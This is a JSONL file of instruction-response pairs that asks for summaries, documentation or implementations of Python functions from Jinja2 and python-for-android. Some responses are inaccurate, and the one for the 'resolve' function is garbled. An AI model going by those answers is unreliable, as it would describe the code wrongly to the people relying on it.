{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef babel_extract(fileobj, keywords, comment_tags, options):\n    extensions = set()\n    for extension in options.get('extensions', '').split(','):\n        extension = extension.strip()\n        if not extension:\n            continue\n        extensions.add(import_string(extension))\n    if InternationalizationExtension not in extensions:\n        extensions.add(InternationalizationExtension)\n\n    environment = get_spontaneous_environment(\n        options.get('block_start_string', BLOCK_START_STRING),\n        options.get('block_end_string', BLOCK_END_STRING),\n        options.get('variable_start_string', VARIABLE_START_STRING),\n        options.get('variable_end_string', VARIABLE_END_STRING),\n        options.get('comment_start_string', COMMENT_START_STRING),\n        options.get('comment_end_string', COMMENT_END_STRING),\n        options.get('line_statement_prefix') or LINE_STATEMENT_PREFIX,\n        options.get('line_comment_prefix') or LINE_COMMENT_PREFIX,\n        str(options.get('trim_blocks', TRIM_BLOCKS)).lower() in \\\n            ('1', 'on', 'yes', 'true'),\n        NEWLINE_SEQUENCE, frozenset(extensions),\n        # fill with defaults so that environments are shared\n        # with other spontaneus environments.  The rest of the\n        # arguments are optimizer, undefined, finalize, autoescape,\n        # loader, cache size, auto reloading setting and the\n        # bytecode cache\n        True, Undefined, None, False, None, 0, False, None\n    )\n\n    source = fileobj.read().decode(options.get('encoding', 'utf-8'))\n    try:\n        node = environment.parse(source)\n        tokens = list(environment.lex(environment.preprocess(source)))\n    except TemplateSyntaxError as e:\n        # skip templates with syntax errors\n        return\n\n    finder = _CommentFinder(tokens, comment_tags)\n    for lineno, func, message in extract_from_ast(node, keywords):\n        yield lineno, func, message, finder.find_comments(lineno)", "response": "This method is used to extract a set of translation functions from a file - like object."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef parse(self, parser):\n        lineno = next(parser.stream).lineno\n\n        # find all the variables referenced.  Additionally a variable can be\n        # defined in the body of the trans block too, but this is checked at\n        # a later state.\n        plural_expr = None\n        variables = {}\n        while parser.stream.current.type != 'block_end':\n            if variables:\n                parser.stream.expect('comma')\n\n            # skip colon for python compatibility\n            if parser.stream.skip_if('colon'):\n                break\n\n            name = parser.stream.expect('name')\n            if name.value in variables:\n                parser.fail('translatable variable %r defined twice.' %\n                            name.value, name.lineno,\n                            exc=TemplateAssertionError)\n\n            # expressions\n            if parser.stream.current.type == 'assign':\n                next(parser.stream)\n                variables[name.value] = var = parser.parse_expression()\n            else:\n                variables[name.value] = var = nodes.Name(name.value, 'load')\n            if plural_expr is None:\n                plural_expr = var\n\n        parser.stream.expect('block_end')\n\n        plural = plural_names = None\n        have_plural = False\n        referenced = set()\n\n        # now parse until endtrans or pluralize\n        singular_names, singular = self._parse_block(parser, True)\n        if singular_names:\n            referenced.update(singular_names)\n            if plural_expr is None:\n                plural_expr = nodes.Name(singular_names[0], 'load')\n\n        # if we have a pluralize block, we parse that too\n        if parser.stream.current.test('name:pluralize'):\n            have_plural = True\n            next(parser.stream)\n            if parser.stream.current.type != 'block_end':\n                name = parser.stream.expect('name')\n                if name.value not in variables:\n                    parser.fail('unknown variable %r for pluralization' %\n                                name.value, name.lineno,\n                                exc=TemplateAssertionError)\n                plural_expr = variables[name.value]\n            parser.stream.expect('block_end')\n            plural_names, plural = self._parse_block(parser, False)\n            next(parser.stream)\n            referenced.update(plural_names)\n        else:\n            next(parser.stream)\n\n        # register free names as simple name expressions\n        for var in referenced:\n            if var not in variables:\n                variables[var] = nodes.Name(var, 'load')\n\n        # no variables referenced?  no need to escape\n        if not referenced:\n            singular = singular.replace('%%', '%')\n            if plural:\n                plural = plural.replace('%%', '%')\n\n        if not have_plural:\n            plural_expr = None\n        elif plural_expr is None:\n            parser.fail('pluralize without variables', lineno)\n\n        if variables:\n            variables = nodes.Dict([nodes.Pair(nodes.Const(x, lineno=lineno), y)\n                                    for x, y in variables.items()])\n        else:\n            variables = None\n\n        node = self._make_node(singular, plural, variables, plural_expr)\n        node.set_lineno(lineno)\n        return node", "response": "Parse a translatable tag."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _make_node(self, singular, plural, variables, plural_expr):\n        # singular only:\n        if plural_expr is None:\n            gettext = nodes.Name('gettext', 'load')\n            node = nodes.Call(gettext, [nodes.Const(singular)],\n                              [], None, None)\n\n        # singular and plural\n        else:\n            ngettext = nodes.Name('ngettext', 'load')\n            node = nodes.Call(ngettext, [\n                nodes.Const(singular),\n                nodes.Const(plural),\n                plural_expr\n            ], [], None, None)\n\n        # mark the return value as safe if we are in an\n        # environment with autoescaping turned on\n        if self.environment.autoescape:\n            node = nodes.MarkSafe(node)\n\n        if variables:\n            node = nodes.Mod(node, variables)\n        return nodes.Output([node])", "response": "Generates a useful node from the data provided."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef load_extensions(environment, extensions):\n    result = {}\n    for extension in extensions:\n        if isinstance(extension, basestring):\n            extension = import_string(extension)\n        result[extension.identifier] = extension(environment)\n    return result", "response": "Load the extensions from the list and bind it to the environment."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef extend(self, **attributes):\n        for key, value in attributes.iteritems():\n            if not hasattr(self, key):\n                setattr(self, key, value)", "response": "Add the items to the instance of the environment if they do not exist yet."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncompiles a node or template source code.", "response": "def compile(self, source, name=None, filename=None, raw=False,\n                defer_init=False):\n        \"\"\"Compile a node or template source code.  The `name` parameter is\n        the load name of the template after it was joined using\n        :meth:`join_path` if necessary, not the filename on the file system.\n        the `filename` parameter is the estimated filename of the template on\n        the file system.  If the template came from a database or memory this\n        can be omitted.\n\n        The return value of this method is a python code object.  If the `raw`\n        parameter is `True` the return value will be a string with python\n        code equivalent to the bytecode returned otherwise.  This method is\n        mainly used internally.\n\n        `defer_init` is use internally to aid the module code generator.  This\n        causes the generated code to be able to import without the global\n        environment variable to be set.\n\n        .. versionadded:: 2.4\n           `defer_init` parameter added.\n        \"\"\"\n        source_hint = None\n        try:\n            if isinstance(source, basestring):\n                source_hint = source\n                source = self._parse(source, name, filename)\n            if self.optimized:\n                source = optimize(source, self)\n            source = generate(source, self, name, filename,\n                              defer_init=defer_init)\n            if raw:\n                return source\n            if filename is None:\n                filename = '<template>'\n            else:\n                filename = _encode_filename(filename)\n            return compile(source, filename, 'exec')\n        except TemplateSyntaxError:\n            exc_info = sys.exc_info()\n        self.handle_exception(exc_info, source_hint=source)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating a new object from a compiled code and the globals.", "response": "def from_code(cls, environment, code, globals, uptodate=None):\n        \"\"\"Creates a template object from compiled code and the globals.  This\n        is used by the loaders and environment to create a template object.\n        \"\"\"\n        namespace = {\n            'environment':  environment,\n            '__file__':     code.co_filename\n        }\n        exec code in namespace\n        rv = cls._from_namespace(environment, namespace, globals)\n        rv._uptodate = uptodate\n        return rv"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef render(self, *args, **kwargs):\n        vars = dict(*args, **kwargs)\n        try:\n            return concat(self.root_render_func(self.new_context(vars)))\n        except:\n            exc_info = sys.exc_info()\n        return self.environment.handle_exception(exc_info, True)", "response": "This method renders the template with the given arguments."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngenerating a generator that yields one item after another.", "response": "def generate(self, *args, **kwargs):\n        \"\"\"For very large templates it can be useful to not render the whole\n        template at once but evaluate each statement after another and yield\n        piece for piece.  This method basically does exactly that and returns\n        a generator that yields one item after another as unicode strings.\n\n        It accepts the same arguments as :meth:`render`.\n        \"\"\"\n        vars = dict(*args, **kwargs)\n        try:\n            for event in self.root_render_func(self.new_context(vars)):\n                yield event\n        except:\n            exc_info = sys.exc_info()\n        else:\n            return\n        yield self.environment.handle_exception(exc_info, True)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef module(self):\n        if self._module is not None:\n            return self._module\n        self._module = rv = self.make_module()\n        return rv", "response": "The module that contains the available template variables."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef debug_info(self):\n        return [tuple(map(int, x.split('='))) for x in\n                self._debug_info.split('&')]", "response": "The debug info mapping."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ndumps the complete stream into a file - like object.", "response": "def dump(self, fp, encoding=None, errors='strict'):\n        \"\"\"Dump the complete stream into a file or file-like object.\n        Per default unicode strings are written, if you want to encode\n        before writing specifiy an `encoding`.\n\n        Example usage::\n\n            Template('Hello {{ name }}!').stream(name='foo').dump('hello.html')\n        \"\"\"\n        close = False\n        if isinstance(fp, basestring):\n            fp = file(fp, 'w')\n            close = True\n        try:\n            if encoding is not None:\n                iterable = (x.encode(encoding, errors) for x in self)\n            else:\n                iterable = self\n            if hasattr(fp, 'writelines'):\n                fp.writelines(iterable)\n            else:\n                for item in iterable:\n                    fp.write(item)\n        finally:\n            if close:\n                fp.close()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ndisabling the output buffering.", "response": "def disable_buffering(self):\n        \"\"\"Disable the output buffering.\"\"\"\n        self._next = self._gen.next\n        self.buffered = False"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nenabling buffering. Buffer `size` items before yielding them.", "response": "def enable_buffering(self, size=5):\n        \"\"\"Enable buffering.  Buffer `size` items before yielding them.\"\"\"\n        if size <= 1:\n            raise ValueError('buffer size too small')\n\n        def generator(next):\n            buf = []\n            c_size = 0\n            push = buf.append\n\n            while 1:\n                try:\n                    while c_size < size:\n                        c = next()\n                        push(c)\n                        if c:\n                            c_size += 1\n                except StopIteration:\n                    if not c_size:\n                        return\n                yield concat(buf)\n                del buf[:]\n                c_size = 0\n\n        self.buffered = True\n        self._next = generator(self._gen.next).next"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef dist_from_args(ctx, args):\n    return Distribution.get_distribution(\n        ctx,\n        name=args.dist_name,\n        recipes=split_argument_list(args.requirements),\n        ndk_api=args.ndk_api,\n        force_build=args.force_build,\n        require_perfect_match=args.require_perfect_match,\n        allow_replace_dist=args.allow_replace_dist)", "response": "Parses out any distribution - related arguments and uses them to\n    obtain a Distribution class instance for the build."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef build_dist_from_args(ctx, dist, args):\n    bs = Bootstrap.get_bootstrap(args.bootstrap, ctx)\n    blacklist = getattr(args, \"blacklist_requirements\", \"\").split(\",\")\n    if len(blacklist) == 1 and blacklist[0] == \"\":\n        blacklist = []\n    build_order, python_modules, bs = (\n        get_recipe_order_and_bootstrap(\n            ctx, dist.recipes, bs,\n            blacklist=blacklist\n        ))\n    assert set(build_order).intersection(set(python_modules)) == set()\n    ctx.recipe_build_order = build_order\n    ctx.python_modules = python_modules\n\n    info('The selected bootstrap is {}'.format(bs.name))\n    info_main('# Creating dist with {} bootstrap'.format(bs.name))\n    bs.distribution = dist\n    info_notify('Dist will have name {} and requirements ({})'.format(\n        dist.name, ', '.join(dist.recipes)))\n    info('Dist contains the following requirements as recipes: {}'.format(\n        ctx.recipe_build_order))\n    info('Dist will also contain modules ({}) installed from pip'.format(\n        ', '.join(ctx.python_modules)))\n\n    ctx.dist_name = bs.distribution.name\n    ctx.prepare_bootstrap(bs)\n    if dist.needs_build:\n        ctx.prepare_dist(ctx.dist_name)\n\n    build_recipes(build_order, python_modules, ctx, args.private,\n                  ignore_project_setup_py=args.ignore_setup_py,\n                 )\n\n    ctx.bootstrap.run_distribute()\n\n    info_main('# Your distribution was created successfully, exiting.')\n    info('Dist can be found at (for now) {}'\n         .format(join(ctx.dist_dir, ctx.dist_name)))", "response": "Parses out any bootstrap related arguments and uses them to build a dist."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nprints warning messages for any deprecated arguments that were passed.", "response": "def warn_on_deprecated_args(self, args):\n        \"\"\"\n        Print warning messages for any deprecated arguments that were passed.\n        \"\"\"\n\n        # Output warning if setup.py is present and neither --ignore-setup-py\n        # nor --use-setup-py was specified.\n        if getattr(args, \"private\", None) is not None and \\\n                (os.path.exists(os.path.join(args.private, \"setup.py\")) or\n                 os.path.exists(os.path.join(args.private, \"pyproject.toml\"))\n                ):\n            if not getattr(args, \"use_setup_py\", False) and \\\n                    not getattr(args, \"ignore_setup_py\", False):\n                warning(\"  **** FUTURE BEHAVIOR CHANGE WARNING ****\")\n                warning(\"Your project appears to contain a setup.py file.\")\n                warning(\"Currently, these are ignored by default.\")\n                warning(\"This will CHANGE in an upcoming version!\")\n                warning(\"\")\n                warning(\"To ensure your setup.py is ignored, please specify:\")\n                warning(\"    --ignore-setup-py\")\n                warning(\"\")\n                warning(\"To enable what will some day be the default, specify:\")\n                warning(\"    --use-setup-py\")\n\n        # NDK version is now determined automatically\n        if args.ndk_version is not None:\n            warning('--ndk-version is deprecated and no longer necessary, '\n                    'the value you passed is ignored')\n        if 'ANDROIDNDKVER' in environ:\n            warning('$ANDROIDNDKVER is deprecated and no longer necessary, '\n                    'the value you set is ignored')"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nlists all the bootstraps available to build with.", "response": "def bootstraps(self, _args):\n        \"\"\"List all the bootstraps available to build with.\"\"\"\n        for bs in Bootstrap.list_bootstraps():\n            bs = Bootstrap.get_bootstrap(bs, self.ctx)\n            print('{Fore.BLUE}{Style.BRIGHT}{bs.name}{Style.RESET_ALL}'\n                  .format(bs=bs, Fore=Out_Fore, Style=Out_Style))\n            print('    {Fore.GREEN}depends: {bs.recipe_depends}{Fore.RESET}'\n                  .format(bs=bs, Fore=Out_Fore))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef clean_all(self, args):\n        self.clean_dists(args)\n        self.clean_builds(args)\n        self.clean_download_cache(args)", "response": "Delete all build components ; the package cache package builds bootstrap builds and distributions."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef clean_dists(self, _args):\n        ctx = self.ctx\n        if exists(ctx.dist_dir):\n            shutil.rmtree(ctx.dist_dir)", "response": "Delete all compiled distributions in the internal distribution\n        directory."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ndeletes all the bootstrap builds.", "response": "def clean_bootstrap_builds(self, _args):\n        \"\"\"Delete all the bootstrap builds.\"\"\"\n        if exists(join(self.ctx.build_dir, 'bootstrap_builds')):\n            shutil.rmtree(join(self.ctx.build_dir, 'bootstrap_builds'))"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef clean_builds(self, _args):\n        ctx = self.ctx\n        if exists(ctx.build_dir):\n            shutil.rmtree(ctx.build_dir)\n        if exists(ctx.python_installs_dir):\n            shutil.rmtree(ctx.python_installs_dir)\n        libs_dir = join(self.ctx.build_dir, 'libs_collections')\n        if exists(libs_dir):\n            shutil.rmtree(libs_dir)", "response": "Delete all build caches for each recipe python - install java code\n        and compiled libs collection."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef clean_recipe_build(self, args):\n        recipe = Recipe.get_recipe(args.recipe, self.ctx)\n        info('Cleaning build for {} recipe.'.format(recipe.name))\n        recipe.clean_build()\n        if not args.no_clean_dists:\n            self.clean_dists(args)", "response": "Deletes the build files of the given recipe."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncleaning up the download cache for recipes passed as arguments.", "response": "def clean_download_cache(self, args):\n        \"\"\" Deletes a download cache for recipes passed as arguments. If no\n        argument is passed, it'll delete *all* downloaded caches. ::\n\n            p4a clean_download_cache kivy,pyjnius\n\n        This does *not* delete the build caches or final distributions.\n        \"\"\"\n        ctx = self.ctx\n        if hasattr(args, 'recipes') and args.recipes:\n            for package in args.recipes:\n                remove_path = join(ctx.packages_path, package)\n                if exists(remove_path):\n                    shutil.rmtree(remove_path)\n                    info('Download cache removed for: \"{}\"'.format(package))\n                else:\n                    warning('No download cache found for \"{}\", skipping'.format(\n                        package))\n        else:\n            if exists(ctx.packages_path):\n                shutil.rmtree(ctx.packages_path)\n                info('Download cache removed.')\n            else:\n                print('No cache found at \"{}\"'.format(ctx.packages_path))"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef export_dist(self, args):\n        ctx = self.ctx\n        dist = dist_from_args(ctx, args)\n        if dist.needs_build:\n            raise BuildInterruptingException(\n                'You asked to export a dist, but there is no dist '\n                'with suitable recipes available. For now, you must '\n                ' create one first with the create argument.')\n        if args.symlink:\n            shprint(sh.ln, '-s', dist.dist_dir, args.output_dir)\n        else:\n            shprint(sh.cp, '-r', dist.dist_dir, args.output_dir)", "response": "Copies a created dist to an output dir."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncreates an APK using the given distribution.", "response": "def apk(self, args):\n        \"\"\"Create an APK using the given distribution.\"\"\"\n\n        ctx = self.ctx\n        dist = self._dist\n\n        # Manually fixing these arguments at the string stage is\n        # unsatisfactory and should probably be changed somehow, but\n        # we can't leave it until later as the build.py scripts assume\n        # they are in the current directory.\n        fix_args = ('--dir', '--private', '--add-jar', '--add-source',\n                    '--whitelist', '--blacklist', '--presplash', '--icon')\n        unknown_args = args.unknown_args\n        for i, arg in enumerate(unknown_args):\n            argx = arg.split('=')\n            if argx[0] in fix_args:\n                if len(argx) > 1:\n                    unknown_args[i] = '='.join(\n                        (argx[0], realpath(expanduser(argx[1]))))\n                elif i + 1 < len(unknown_args):\n                    unknown_args[i+1] = realpath(expanduser(unknown_args[i+1]))\n\n        env = os.environ.copy()\n        if args.build_mode == 'release':\n            if args.keystore:\n                env['P4A_RELEASE_KEYSTORE'] = realpath(expanduser(args.keystore))\n            if args.signkey:\n                env['P4A_RELEASE_KEYALIAS'] = args.signkey\n            if args.keystorepw:\n                env['P4A_RELEASE_KEYSTORE_PASSWD'] = args.keystorepw\n            if args.signkeypw:\n                env['P4A_RELEASE_KEYALIAS_PASSWD'] = args.signkeypw\n            elif args.keystorepw and 'P4A_RELEASE_KEYALIAS_PASSWD' not in env:\n                env['P4A_RELEASE_KEYALIAS_PASSWD'] = args.keystorepw\n\n        build = imp.load_source('build', join(dist.dist_dir, 'build.py'))\n        with current_directory(dist.dist_dir):\n            self.hook(\"before_apk_build\")\n            os.environ[\"ANDROID_API\"] = str(self.ctx.android_api)\n            build_args = build.parse_args(args.unknown_args)\n            self.hook(\"after_apk_build\")\n            self.hook(\"before_apk_assemble\")\n\n            build_type = ctx.java_build_tool\n            if build_type == 'auto':\n                info('Selecting java build tool:')\n\n                build_tools_versions = os.listdir(join(ctx.sdk_dir,\n                                                       'build-tools'))\n                build_tools_versions = sorted(build_tools_versions,\n                                              key=LooseVersion)\n                build_tools_version = build_tools_versions[-1]\n                info(('Detected highest available build tools '\n                      'version to be {}').format(build_tools_version))\n\n                if build_tools_version >= '25.0' and exists('gradlew'):\n                    build_type = 'gradle'\n                    info('    Building with gradle, as gradle executable is '\n                         'present')\n                else:\n                    build_type = 'ant'\n                    if build_tools_version < '25.0':\n                        info(('    Building with ant, as the highest '\n                              'build-tools-version is only {}').format(\n                            build_tools_version))\n                    else:\n                        info('    Building with ant, as no gradle executable '\n                             'detected')\n\n            if build_type == 'gradle':\n                # gradle-based build\n                env[\"ANDROID_NDK_HOME\"] = self.ctx.ndk_dir\n                env[\"ANDROID_HOME\"] = self.ctx.sdk_dir\n\n                gradlew = sh.Command('./gradlew')\n                if exists('/usr/bin/dos2unix'):\n                    # .../dists/bdisttest_python3/gradlew\n                    # .../build/bootstrap_builds/sdl2-python3crystax/gradlew\n                    # if docker on windows, gradle contains CRLF\n                    output = shprint(\n                        sh.Command('dos2unix'), gradlew._path.decode('utf8'),\n                        _tail=20, _critical=True, _env=env\n                    )\n                if args.build_mode == \"debug\":\n                    gradle_task = \"assembleDebug\"\n                elif args.build_mode == \"release\":\n                    gradle_task = \"assembleRelease\"\n                else:\n                    raise BuildInterruptingException(\n                        \"Unknown build mode {} for apk()\".format(args.build_mode))\n                output = shprint(gradlew, gradle_task, _tail=20,\n                                 _critical=True, _env=env)\n\n                # gradle output apks somewhere else\n                # and don't have version in file\n                apk_dir = join(dist.dist_dir,\n                               \"build\", \"outputs\", \"apk\",\n                               args.build_mode)\n                apk_glob = \"*-{}.apk\"\n                apk_add_version = True\n\n            else:\n                # ant-based build\n                try:\n                    ant = sh.Command('ant')\n                except sh.CommandNotFound:\n                    raise BuildInterruptingException(\n                        'Could not find ant binary, please install it '\n                        'and make sure it is in your $PATH.')\n                output = shprint(ant, args.build_mode, _tail=20,\n                                 _critical=True, _env=env)\n                apk_dir = join(dist.dist_dir, \"bin\")\n                apk_glob = \"*-*-{}.apk\"\n                apk_add_version = False\n\n            self.hook(\"after_apk_assemble\")\n\n        info_main('# Copying APK to current directory')\n\n        apk_re = re.compile(r'.*Package: (.*\\.apk)$')\n        apk_file = None\n        for line in reversed(output.splitlines()):\n            m = apk_re.match(line)\n            if m:\n                apk_file = m.groups()[0]\n                break\n\n        if not apk_file:\n            info_main('# APK filename not found in build output. Guessing...')\n            if args.build_mode == \"release\":\n                suffixes = (\"release\", \"release-unsigned\")\n            else:\n                suffixes = (\"debug\", )\n            for suffix in suffixes:\n                apks = glob.glob(join(apk_dir, apk_glob.format(suffix)))\n                if apks:\n                    if len(apks) > 1:\n                        info('More than one built APK found... guessing you '\n                             'just built {}'.format(apks[-1]))\n                    apk_file = apks[-1]\n                    break\n            else:\n                raise BuildInterruptingException('Couldn\\'t find the built APK')\n\n        info_main('# Found APK file: {}'.format(apk_file))\n        if apk_add_version:\n            info('# Add version number to APK')\n            apk_name, apk_suffix = basename(apk_file).split(\"-\", 1)\n            apk_file_dest = \"{}-{}-{}\".format(\n                apk_name, build_args.version, apk_suffix)\n            info('# APK renamed to {}'.format(apk_file_dest))\n            shprint(sh.cp, apk_file, apk_file_dest)\n        else:\n            shprint(sh.cp, apk_file, './')"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef archs(self, _args):\n        print('{Style.BRIGHT}Available target architectures are:'\n              '{Style.RESET_ALL}'.format(Style=Out_Style))\n        for arch in self.ctx.archs:\n            print('    {}'.format(arch.arch))", "response": "List the target architectures available to be built for."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef distributions(self, _args):\n        ctx = self.ctx\n        dists = Distribution.get_distributions(ctx)\n\n        if dists:\n            print('{Style.BRIGHT}Distributions currently installed are:'\n                  '{Style.RESET_ALL}'.format(Style=Out_Style, Fore=Out_Fore))\n            pretty_log_dists(dists, print)\n        else:\n            print('{Style.BRIGHT}There are no dists currently built.'\n                  '{Style.RESET_ALL}'.format(Style=Out_Style))", "response": "Lists all distributions currently installed."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef sdk_tools(self, args):\n        ctx = self.ctx\n        ctx.prepare_build_environment(user_sdk_dir=self.sdk_dir,\n                                      user_ndk_dir=self.ndk_dir,\n                                      user_android_api=self.android_api,\n                                      user_ndk_api=self.ndk_api)\n        android = sh.Command(join(ctx.sdk_dir, 'tools', args.tool))\n        output = android(\n            *args.unknown_args, _iter=True, _out_bufsize=1, _err_to_out=True)\n        for line in output:\n            sys.stdout.write(line)\n            sys.stdout.flush()", "response": "Runs the android tools from the detected SDK directory passing all arguments straight to it."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncalls the adb executable from the SDK passing the given commands as arguments.", "response": "def _adb(self, commands):\n        \"\"\"Call the adb executable from the SDK, passing the given commands as\n        arguments.\"\"\"\n        ctx = self.ctx\n        ctx.prepare_build_environment(user_sdk_dir=self.sdk_dir,\n                                      user_ndk_dir=self.ndk_dir,\n                                      user_android_api=self.android_api,\n                                      user_ndk_api=self.ndk_api)\n        if platform in ('win32', 'cygwin'):\n            adb = sh.Command(join(ctx.sdk_dir, 'platform-tools', 'adb.exe'))\n        else:\n            adb = sh.Command(join(ctx.sdk_dir, 'platform-tools', 'adb'))\n        info_notify('Starting adb...')\n        output = adb(*commands, _iter=True, _out_bufsize=1, _err_to_out=True)\n        for line in output:\n            sys.stdout.write(line)\n            sys.stdout.flush()"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nprinting the status of the specified build.", "response": "def build_status(self, _args):\n        \"\"\"Print the status of the specified build. \"\"\"\n        print('{Style.BRIGHT}Bootstraps whose core components are probably '\n              'already built:{Style.RESET_ALL}'.format(Style=Out_Style))\n\n        bootstrap_dir = join(self.ctx.build_dir, 'bootstrap_builds')\n        if exists(bootstrap_dir):\n            for filen in os.listdir(bootstrap_dir):\n                print('    {Fore.GREEN}{Style.BRIGHT}{filen}{Style.RESET_ALL}'\n                      .format(filen=filen, Fore=Out_Fore, Style=Out_Style))\n\n        print('{Style.BRIGHT}Recipes that are probably already built:'\n              '{Style.RESET_ALL}'.format(Style=Out_Style))\n        other_builds_dir = join(self.ctx.build_dir, 'other_builds')\n        if exists(other_builds_dir):\n            for filen in sorted(os.listdir(other_builds_dir)):\n                name = filen.split('-')[0]\n                dependencies = filen.split('-')[1:]\n                recipe_str = ('    {Style.BRIGHT}{Fore.GREEN}{name}'\n                              '{Style.RESET_ALL}'.format(\n                                  Style=Out_Style, name=name, Fore=Out_Fore))\n                if dependencies:\n                    recipe_str += (\n                        ' ({Fore.BLUE}with ' + ', '.join(dependencies) +\n                        '{Fore.RESET})').format(Fore=Out_Fore)\n                recipe_str += '{Style.RESET_ALL}'.format(Style=Out_Style)\n                print(recipe_str)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nmakes the build and target directories for the current arch.", "response": "def prebuild_arch(self, arch):\n        \"\"\"Make the build and target directories\"\"\"\n        path = self.get_build_dir(arch.arch)\n        if not exists(path):\n            info(\"creating {}\".format(path))\n            shprint(sh.mkdir, '-p', path)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef resolve(self, key):\n        if key in self.vars:\n            return self.vars[key]\n        if key in self.parent:\n            return self.parent[key]\n        return self.environment.undefined(name=key)", "response": "Looks up a variable like __getitem__ or get but returns an analyse. Analyse the environment variable with the name of the key."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef call(__self, __obj, *args, **kwargs):\n        if __debug__:\n            __traceback_hide__ = True\n        if isinstance(__obj, _context_function_types):\n            if getattr(__obj, 'contextfunction', 0):\n                args = (__self,) + args\n            elif getattr(__obj, 'evalcontextfunction', 0):\n                args = (__self.eval_ctx,) + args\n            elif getattr(__obj, 'environmentfunction', 0):\n                args = (__self.environment,) + args\n        return __obj(*args, **kwargs)", "response": "Call the callable with the arguments and keyword arguments\n        provided but inject the active context or environment as first\n        argument if the callable is a contextfunction or environmentfunction."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nturns a dependency list into lowercase and make sure all entries that are just a string become a tuple of strings", "response": "def fix_deplist(deps):\n    \"\"\" Turn a dependency list into lowercase, and make sure all entries\n        that are just a string become a tuple of strings\n    \"\"\"\n    deps = [\n        ((dep.lower(),)\n         if not isinstance(dep, (list, tuple))\n         else tuple([dep_entry.lower()\n                     for dep_entry in dep\n                    ]))\n        for dep in deps\n    ]\n    return deps"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_dependency_tuple_list_for_recipe(recipe, blacklist=None):\n    if blacklist is None:\n        blacklist = set()\n    assert(type(blacklist) == set)\n    if recipe.depends is None:\n        dependencies = []\n    else:\n        # Turn all dependencies into tuples so that product will work\n        dependencies = fix_deplist(recipe.depends)\n\n        # Filter out blacklisted items and turn lowercase:\n        dependencies = [\n            tuple(set(deptuple) - blacklist)\n            for deptuple in dependencies\n            if tuple(set(deptuple) - blacklist)\n        ]\n    return dependencies", "response": "Returns the list of tuples that are used to work with a given recipe."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef recursively_collect_orders(\n        name, ctx, all_inputs, orders=None, blacklist=None\n        ):\n    '''For each possible recipe ordering, try to add the new recipe name\n    to that order. Recursively do the same thing with all the\n    dependencies of each recipe.\n\n    '''\n    name = name.lower()\n    if orders is None:\n        orders = []\n    if blacklist is None:\n        blacklist = set()\n    try:\n        recipe = Recipe.get_recipe(name, ctx)\n        dependencies = get_dependency_tuple_list_for_recipe(\n            recipe, blacklist=blacklist\n        )\n\n        # handle opt_depends: these impose requirements on the build\n        # order only if already present in the list of recipes to build\n        dependencies.extend(fix_deplist(\n            [[d] for d in recipe.get_opt_depends_in_list(all_inputs)\n             if d.lower() not in blacklist]\n        ))\n\n        if recipe.conflicts is None:\n            conflicts = []\n        else:\n            conflicts = [dep.lower() for dep in recipe.conflicts]\n    except ValueError:\n        # The recipe does not exist, so we assume it can be installed\n        # via pip with no extra dependencies\n        dependencies = []\n        conflicts = []\n\n    new_orders = []\n    # for each existing recipe order, see if we can add the new recipe name\n    for order in orders:\n        if name in order:\n            new_orders.append(deepcopy(order))\n            continue\n        if order.conflicts():\n            continue\n        if any([conflict in order for conflict in conflicts]):\n            continue\n\n        for dependency_set in product(*dependencies):\n            new_order = deepcopy(order)\n            new_order[name] = set(dependency_set)\n\n            dependency_new_orders = [new_order]\n            for dependency in dependency_set:\n                dependency_new_orders = recursively_collect_orders(\n                    dependency, ctx, all_inputs, dependency_new_orders,\n                    blacklist=blacklist\n                )\n\n            new_orders.extend(dependency_new_orders)\n\n    return new_orders", "response": "Recursively collect all the possible recipe names and dependencies of a single recipe."}
